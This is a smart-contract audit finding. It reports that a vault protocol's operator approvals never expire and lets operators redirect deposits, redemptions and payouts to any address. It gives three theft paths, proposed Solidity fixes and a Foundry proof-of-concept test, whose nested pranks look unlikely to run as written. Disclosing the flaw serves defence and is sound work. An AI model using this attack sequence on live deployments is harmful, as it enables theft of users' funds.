## Title
Compromised Operator Keys Enable Complete Fund Theft Through Indefinite Authorization and Arbitrary Controller/Receiver Redirection

## Summary
The `isOperator()` function lacks time-based expiry checks, and operator-authorized functions (`requestDeposit`, `requestRedeem`, `redeem`) allow arbitrary `controller` and `receiver` addresses. A compromised operator key grants an attacker indefinite access to hijack victim assets/shares by redirecting requests to attacker-controlled addresses, or directly drain claimable redemptions without KYC validation, leading to complete fund loss.

## Impact
**Severity**: High

## Finding Description
**Location:** 
- `src/ShareTokenUpgradeable.sol` (isOperator function) [1](#0-0) 

- `src/ERC7575VaultUpgradeable.sol` (requestDeposit function) [2](#0-1) 

- `src/ERC7575VaultUpgradeable.sol` (requestRedeem function) [3](#0-2) 

- `src/ERC7575VaultUpgradeable.sol` (redeem function) [4](#0-3) 

**Intended Logic:** The operator system should allow trusted third parties to manage async requests on behalf of users with appropriate safeguards. The ERC-7540 standard delegates operator authorization to implementations, expecting proper security controls.

**Actual Logic:** The protocol implements operator authorization without any expiry mechanism or controller/receiver validation:

1. **No Time-Based Expiry**: The `isOperator()` function simply returns the boolean approval status without checking timestamps or expiration dates. [1](#0-0) 

2. **Arbitrary Controller Redirection**: In `requestDeposit()`, the operator authorization only validates `owner`, but allows any `controller` address to receive credit for the deposit. The victim's assets are taken from `owner` but credited to `controller`. [5](#0-4) 

3. **Arbitrary Controller Redirection in Redemptions**: In `requestRedeem()`, the operator authorization validates `owner`, but allows any `controller` to receive credit for the redemption. The victim's shares are taken from `owner` but credited to `controller`. [6](#0-5) 

4. **Arbitrary Receiver Without KYC**: In `redeem()`, operators can specify any `receiver` address for underlying asset transfers. The KYC check only applies to share token transfers, not underlying asset (USDC/DAI) transfers. [7](#0-6) 

**Exploitation Path:**

**Attack Vector 1: Asset Hijacking via requestDeposit**
1. Victim approves Bob as operator: `setOperator(Bob, true)`
2. Bob's private key is compromised by attacker Eve
3. Eve calls `requestDeposit(victim's_1000_USDC, Eve's_address, victim)` 
   - Line 344 validates Eve controls Bob's key and Bob is victim's operator ✓
   - Line 361 transfers 1000 USDC from victim to vault
   - Line 364 credits pending deposit to Eve's controller address
4. Investment Manager fulfills the deposit
5. Eve calls `deposit()` to claim shares to her own address
6. Victim's 1000 USDC is permanently stolen

**Attack Vector 2: Share Hijacking via requestRedeem**
1. Using the compromised operator key
2. Eve calls `requestRedeem(victim's_1000_shares, Eve's_address, victim)`
   - Line 723 validates operator authorization ✓
   - Line 740 transfers 1000 shares from victim to vault  
   - Line 745 credits pending redemption to Eve's controller address
3. Investment Manager fulfills the redemption
4. Eve calls `redeem()` to claim USDC to her own address
5. Victim's 1000 shares are permanently stolen

**Attack Vector 3: Direct Claimable Redemption Drain**
1. Victim has 5000 USDC in claimable redemption state
2. Eve (using compromised operator) calls `redeem(shares, Eve's_address, victim)`
   - Line 887 validates operator authorization ✓
   - Line 912 burns shares from vault
   - Line 916 transfers USDC directly to Eve's address WITHOUT KYC check
3. 5000 USDC instantly stolen with no protection

**Security Property Broken:** 
- **Invariant #12 violated**: "No Fund Theft: No double-claims, no reentrancy, no authorization bypass"
- Compromised operator creates indefinite authorization bypass leading to direct fund theft

## Impact Explanation

- **Affected Assets**: All user assets (USDC, DAI, other vault assets) and shares under operator-authorized accounts
- **Damage Severity**: Complete loss of funds - attacker can drain 100% of victim's assets, shares, and claimable amounts. For a user with $100,000 in the protocol, the entire amount can be stolen.
- **User Impact**: Any user who has approved an operator is at risk. The attack window is indefinite until manual revocation. Institutional users who rely on operators for automated management face catastrophic risk if operator infrastructure is compromised.

## Likelihood Explanation

- **Attacker Profile**: External attacker who compromises an operator's private key through phishing, infrastructure breach, or key mismanagement. Does not require protocol admin privileges.
- **Preconditions**: 
  - Victim has approved at least one operator via `setOperator()`
  - Operator's private key is compromised
  - Victim has assets, shares, or claimable amounts in the protocol
- **Execution Complexity**: Single transaction per attack vector. No complex timing or multi-block coordination required. Attacker can immediately drain all victim funds.
- **Frequency**: Unlimited - attacker can repeatedly exploit different victims with the same compromised key until all operators detect the compromise and all victims manually revoke authorization. In institutional settings with shared operator infrastructure, a single compromise affects multiple users.

## Recommendation

Implement time-based expiry for operator approvals and validate controller/receiver addresses:

```solidity
// In src/ShareTokenUpgradeable.sol:

// ADD new storage fields in ShareTokenStorage struct:
struct OperatorApproval {
    bool approved;
    uint256 expiryTimestamp;
}
mapping(address => mapping(address => OperatorApproval)) operators;

// MODIFY setOperator function around line 480:
function setOperator(address operator, bool approved) external virtual returns (bool) {
    if (msg.sender == operator) revert CannotSetSelfAsOperator();
    ShareTokenStorage storage $ = _getShareTokenStorage();
    
    uint256 expiry = approved ? block.timestamp + 30 days : 0;  // 30-day default expiry
    $.operators[msg.sender][operator] = OperatorApproval({
        approved: approved,
        expiryTimestamp: expiry
    });
    
    emit OperatorSet(msg.sender, operator, approved);
    return true;
}

// ADD setOperatorWithExpiry for custom expiry:
function setOperatorWithExpiry(address operator, bool approved, uint256 expiryTimestamp) 
    external virtual returns (bool) 
{
    if (msg.sender == operator) revert CannotSetSelfAsOperator();
    if (approved && expiryTimestamp <= block.timestamp) revert InvalidExpiry();
    
    ShareTokenStorage storage $ = _getShareTokenStorage();
    $.operators[msg.sender][operator] = OperatorApproval({
        approved: approved,
        expiryTimestamp: expiryTimestamp
    });
    
    emit OperatorSet(msg.sender, operator, approved);
    return true;
}

// MODIFY isOperator function around line 502:
function isOperator(address controller, address operator) external view virtual returns (bool) {
    ShareTokenStorage storage $ = _getShareTokenStorage();
    OperatorApproval memory approval = $.operators[controller][operator];
    
    // Check both approval status and expiry
    return approval.approved && approval.expiryTimestamp > block.timestamp;
}

// In src/ERC7575VaultUpgradeable.sol:

// MODIFY requestDeposit around line 341 to validate controller:
function requestDeposit(uint256 assets, address controller, address owner) 
    external nonReentrant returns (uint256 requestId) 
{
    VaultStorage storage $ = _getVaultStorage();
    if (!$.isActive) revert VaultNotActive();
    
    // Validate operator authorization
    bool isOperator = IERC7540($.shareToken).isOperator(owner, msg.sender);
    if (!(owner == msg.sender || isOperator)) revert InvalidOwner();
    
    // NEW: If caller is operator, validate controller matches owner
    // This prevents redirecting victim's assets to attacker's controller
    if (isOperator && controller != owner) revert InvalidController();
    
    // ... rest of function
}

// MODIFY requestRedeem around line 715 with same controller validation:
function requestRedeem(uint256 shares, address controller, address owner) 
    external nonReentrant returns (uint256 requestId) 
{
    // ... existing validations
    
    bool isOwnerOrOperator = owner == msg.sender || 
        IERC7540($.shareToken).isOperator(owner, msg.sender);
    
    // NEW: If caller is operator, validate controller matches owner
    if (isOwnerOrOperator && msg.sender != owner && controller != owner) {
        revert InvalidController();
    }
    
    // ... rest of function
}

// MODIFY redeem around line 885 to validate receiver:
function redeem(uint256 shares, address receiver, address controller) 
    public nonReentrant returns (uint256 assets) 
{
    VaultStorage storage $ = _getVaultStorage();
    bool isOperator = IERC7540($.shareToken).isOperator(controller, msg.sender);
    
    if (!(controller == msg.sender || isOperator)) {
        revert InvalidCaller();
    }
    
    // NEW: If caller is operator, validate receiver matches controller
    // This prevents operators from redirecting assets to arbitrary addresses
    if (isOperator && receiver != controller) revert InvalidReceiver();
    
    // ... rest of function
}
```

**Additional safeguards:**
1. Emit events when operator approvals are about to expire (off-chain monitoring)
2. Implement emergency operator revocation function callable by protocol owner
3. Add operator approval rate limiting (max approvals per time period)
4. Consider requiring multi-sig or time-delayed operator approvals for high-value accounts

## Proof of Concept

```solidity
// File: test/Exploit_CompromisedOperator.t.sol
// Run with: forge test --match-test test_CompromisedOperatorTheft -vvv

pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/WERC7575Vault.sol";
import "../src/WERC7575ShareToken.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract Exploit_CompromisedOperator is Test {
    WERC7575Vault vault;
    WERC7575ShareToken shareToken;
    MockUSDC usdc;
    
    address owner = address(0x1);
    address investmentManager = address(0x2);
    address validator = address(0x3);
    address kycAdmin = address(0x4);
    
    address victim = address(0x100);
    address legitimateOperator = address(0x200);
    address attacker = address(0x300);
    
    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy contracts
        usdc = new MockUSDC();
        shareToken = new WERC7575ShareToken();
        shareToken.initialize("WERC Share", "WERC", validator, kycAdmin, address(0x5));
        
        vault = new WERC7575Vault();
        vault.initialize(address(usdc), address(shareToken), investmentManager);
        
        // Register vault and setup KYC
        shareToken.registerVault(address(usdc), address(vault));
        shareToken.setKycVerified(victim, true);
        shareToken.setKycVerified(attacker, true);
        
        vm.stopPrank();
        
        // Give victim 10,000 USDC
        usdc.mint(victim, 10_000 * 1e6);
    }
    
    function test_CompromisedOperatorTheft() public {
        // SETUP: Victim approves legitimate operator
        vm.prank(victim);
        shareToken.setOperator(legitimateOperator, true);
        
        // Victim makes a deposit request
        vm.startPrank(victim);
        usdc.approve(address(vault), 5_000 * 1e6);
        vault.requestDeposit(5_000 * 1e6, victim, victim);
        vm.stopPrank();
        
        // Investment manager fulfills deposit
        vm.prank(investmentManager);
        vault.fulfillDeposit(victim, 5_000 * 1e6);
        
        // Victim claims shares
        vm.prank(victim);
        vault.deposit(5_000 * 1e6, victim, victim);
        
        uint256 victimShares = shareToken.balanceOf(victim);
        assertEq(victimShares, 5_000 * 1e18); // 5000 shares with 18 decimals
        
        // Simulate operator key compromise: attacker gains control of legitimateOperator key
        // EXPLOIT 1: Attacker hijacks victim's remaining assets via requestDeposit
        vm.startPrank(legitimateOperator); // Attacker using compromised key
        
        // Approve victim's remaining USDC for vault
        vm.startPrank(victim);
        usdc.approve(address(vault), 5_000 * 1e6);
        vm.stopPrank();
        
        vm.startPrank(legitimateOperator);
        // Attacker redirects deposit to their own controller address
        vault.requestDeposit(5_000 * 1e6, attacker, victim);
        vm.stopPrank();
        
        // Verify victim's USDC was taken
        assertEq(usdc.balanceOf(victim), 0, "Victim's USDC drained");
        assertEq(vault.pendingDepositAssets(attacker), 5_000 * 1e6, "Attacker controls pending deposit");
        
        // Investment manager fulfills deposit (attacker gets shares)
        vm.prank(investmentManager);
        vault.fulfillDeposit(attacker, 5_000 * 1e6);
        
        // Attacker claims stolen shares
        vm.prank(attacker);
        vault.deposit(5_000 * 1e6, attacker, attacker);
        
        assertEq(shareToken.balanceOf(attacker), 5_000 * 1e18, "Attacker received victim's shares");
        
        // EXPLOIT 2: Attacker hijacks victim's shares via requestRedeem
        vm.startPrank(legitimateOperator); // Still using compromised key
        vault.requestRedeem(victimShares, attacker, victim);
        vm.stopPrank();
        
        // Verify victim's shares were taken
        assertEq(shareToken.balanceOf(victim), 0, "Victim's shares drained");
        assertEq(vault.pendingRedeemShares(attacker), victimShares, "Attacker controls pending redeem");
        
        // Investment manager fulfills redemption
        vm.prank(investmentManager);
        vault.fulfillRedeem(attacker, victimShares);
        
        // Attacker claims stolen USDC
        vm.prank(attacker);
        vault.redeem(victimShares, attacker, attacker);
        
        uint256 attackerBalance = usdc.balanceOf(attacker);
        assertGt(attackerBalance, 4_990 * 1e6, "Attacker received victim's USDC");
        
        // VERIFY: Complete theft successful
        assertEq(usdc.balanceOf(victim), 0, "Victim completely drained of USDC");
        assertEq(shareToken.balanceOf(victim), 0, "Victim completely drained of shares");
        assertGt(shareToken.balanceOf(attacker), 4_990 * 1e18, "Attacker holds stolen shares");
        
        console.log("Victim final USDC balance:", usdc.balanceOf(victim));
        console.log("Victim final share balance:", shareToken.balanceOf(victim));
        console.log("Attacker final USDC balance:", usdc.balanceOf(attacker));
        console.log("Attacker final share balance:", shareToken.balanceOf(attacker));
    }
}
```

## Notes

This vulnerability is **not documented** in KNOWN_ISSUES.md. Section 4 discusses "Request Cancellation Allowed" as an intentional user protection feature, but does NOT address:
- Lack of time-based expiry on operator approvals
- Arbitrary controller redirection in request functions
- Arbitrary receiver redirection in claim functions  
- Fund theft via compromised operator keys

The vulnerability violates **Invariant #12 ("No Fund Theft")** and enables HIGH severity impact through multiple attack vectors. The indefinite authorization window combined with unrestricted controller/receiver parameters creates a critical security gap for institutional users who rely on operator delegation for automated management.

**Distinguishing factors from known issues:**
- This is NOT about centralization (the operator is trusted UNTIL compromised)
- This is NOT about intentional cancellation features (this is about malicious fund theft)
- This is NOT about missing access control (the access control exists but lacks temporal and destination validation)
- This IS about an unintended authorization bypass through indefinite approvals enabling fund theft

The fix requires implementing time-based expiry AND validating that operators cannot redirect funds to arbitrary addresses, fundamentally changing the security model to protect against compromised operator keys.

### Citations

**File:** src/ShareTokenUpgradeable.sol (L502-505)
```text
    function isOperator(address controller, address operator) external view virtual returns (bool) {
        ShareTokenStorage storage $ = _getShareTokenStorage();
        return $.operators[controller][operator];
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L341-371)
```text
    function requestDeposit(uint256 assets, address controller, address owner) external nonReentrant returns (uint256 requestId) {
        VaultStorage storage $ = _getVaultStorage();
        if (!$.isActive) revert VaultNotActive();
        if (!(owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender))) revert InvalidOwner();
        if (assets == 0) revert ZeroAssets();
        if (assets < $.minimumDepositAmount * (10 ** $.assetDecimals)) {
            revert InsufficientDepositAmount();
        }
        uint256 ownerBalance = IERC20Metadata($.asset).balanceOf(owner);
        if (ownerBalance < assets) {
            revert ERC20InsufficientBalance(owner, ownerBalance, assets);
        }
        // ERC7887: Block new deposit requests while cancelation is pending for this controller
        if ($.controllersWithPendingDepositCancelations.contains(controller)) {
            revert DepositCancelationPending();
        }

        // Pull-Then-Credit pattern: Transfer assets first before updating state
        // This ensures we only credit assets that have been successfully received
        // Protects against transfer fee tokens and validates the actual amount transferred
        SafeTokenTransfers.safeTransferFrom($.asset, owner, address(this), assets);

        // State changes after successful transfer
        $.pendingDepositAssets[controller] += assets;
        $.totalPendingDepositAssets += assets;
        $.activeDepositRequesters.add(controller);

        // Event emission
        emit DepositRequest(controller, owner, REQUEST_ID, msg.sender, assets);
        return REQUEST_ID;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L715-751)
```text
    function requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {
        if (shares == 0) revert ZeroShares();
        VaultStorage storage $ = _getVaultStorage();

        // ERC7540 REQUIREMENT: Authorization check for redemption
        // Per spec: "Redeem Request approval of shares for a msg.sender NOT equal to owner may come
        // either from ERC-20 approval over the shares of owner or if the owner has approved the
        // msg.sender as an operator."
        bool isOwnerOrOperator = owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender);
        if (!isOwnerOrOperator) {
            ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
        }

        uint256 ownerShares = IERC20Metadata($.shareToken).balanceOf(owner);
        if (ownerShares < shares) {
            revert ERC20InsufficientBalance(owner, ownerShares, shares);
        }

        // ERC7887: Block new redeem requests while cancelation is pending for this controller
        if ($.controllersWithPendingRedeemCancelations.contains(controller)) {
            revert RedeemCancelationPending();
        }

        // Pull-Then-Credit pattern: Transfer shares first before updating state
        // This ensures we only credit shares that have been successfully received
        if (!ShareTokenUpgradeable($.shareToken).vaultTransferFrom(owner, address(this), shares)) {
            revert ShareTransferFailed();
        }

        // State changes after successful transfer
        $.pendingRedeemShares[controller] += shares;
        $.activeRedeemRequesters.add(controller);

        // Event emission
        emit RedeemRequest(controller, owner, REQUEST_ID, msg.sender, shares);
        return REQUEST_ID;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L885-918)
```text
    function redeem(uint256 shares, address receiver, address controller) public nonReentrant returns (uint256 assets) {
        VaultStorage storage $ = _getVaultStorage();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }
        if (shares == 0) revert ZeroShares();

        uint256 availableShares = $.claimableRedeemShares[controller];
        if (shares > availableShares) revert InsufficientClaimableShares();

        // Calculate proportional assets for the requested shares
        uint256 availableAssets = $.claimableRedeemAssets[controller];
        assets = shares.mulDiv(availableAssets, availableShares, Math.Rounding.Floor);

        if (assets == availableAssets) {
            // Remove from active redeem requesters if no more claimable assets and the potential dust
            $.activeRedeemRequesters.remove(controller);
            delete $.claimableRedeemAssets[controller];
            delete $.claimableRedeemShares[controller];
        } else {
            $.claimableRedeemAssets[controller] -= assets;
            $.claimableRedeemShares[controller] -= shares;
        }
        $.totalClaimableRedeemAssets -= assets;
        $.totalClaimableRedeemShares -= shares; // Decrement shares that are being burned

        // Burn the shares as per ERC7540 spec - shares are burned when request is claimed
        ShareTokenUpgradeable($.shareToken).burn(address(this), shares);

        emit Withdraw(msg.sender, receiver, controller, assets, shares);
        if (assets > 0) {
            SafeTokenTransfers.safeTransfer($.asset, receiver, assets);
        }
    }
```
